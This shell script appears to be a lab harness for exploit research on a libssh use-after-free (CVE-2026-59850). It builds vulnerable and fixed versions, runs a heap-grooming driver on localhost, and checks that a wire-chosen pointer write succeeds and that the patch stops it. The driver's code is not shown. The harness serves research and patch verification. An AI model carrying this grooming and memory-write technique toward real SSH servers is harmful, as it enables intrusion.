#!/bin/sh
# W3 follow-on-fault experiment for CVE-2026-59850. The lab app detaches the
# stdout ssh_buffer before freeing a remotely closed channel, so the wire-chosen
# pointer write at pinned channels.c:706 can be observed in a run that finishes
# instead of faulting at :708. This detachment is lab-only, not a realistic app
# pattern; it does not add IP control, marker execution or r5.
# All traffic stays on 127.0.0.1. ASan quarantine is disabled in this lane only.
set -u
cd "$(dirname "$0")" || exit 1

V=libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d
F=libssh-mirror-7dfabb1fd213196c4912c314b418ff36c882ea54

for kind in vuln fixed; do
    src=$V; b=build-asan
    [ "$kind" = fixed ] && { src=$F; b=build-fixed; }
    clang -std=gnu99 -O1 -g -fsanitize=address -fno-omit-frame-pointer \
        -I "$b/src" -I "$src/src" -I "$src/include" -I "$b/include" -I "$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-$kind" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
check() {
    if [ "$2" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1"
    fi
}

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-vuln ./hostkey groom-survive \
    >evidence-wire-vuln-groom-survive.out 2>&1
s=evidence-wire-vuln-groom-survive.out
check survive-buffer-detached "$(grep -q 'SERVER groom-survive saved_buf=0x' "$s" && echo yes)"
check survive-wire-pointer "$(grep -q 'CLIENT sent groom wire pointer=0x' "$s" &&
    grep -q 'SERVER groom alloc=.*survive=1' "$s" && echo yes)"
check survive-buffer-alive "$(grep -q 'SERVER survive buf_len=' "$s" && echo yes)"
check survive-no-asan "$([ "$(grep -c 'ERROR: AddressSanitizer' "$s")" -eq 0 ] && echo yes)"
check survive-target-write "$(grep -q 'SERVER target_after=0x41414141414141c1' "$s" && echo yes)"
check survive-clean-exit "$(grep -q 'CLIENT rc=0 SERVER status=0x0' "$s" && echo yes)"

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-fixed ./hostkey groom-survive \
    >evidence-wire-fixed-groom-survive.out 2>&1
fs=evidence-wire-fixed-groom-survive.out
check fixed-survive-suppressed "$([ "$(grep -c 'SERVER data #2' "$fs")" -eq 0 ] &&
    [ "$(grep -c 'ERROR: AddressSanitizer' "$fs")" -eq 0 ] &&
    grep -q 'SERVER target_after=0x4141414141414141' "$fs" && echo yes)"

echo "RESULT $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
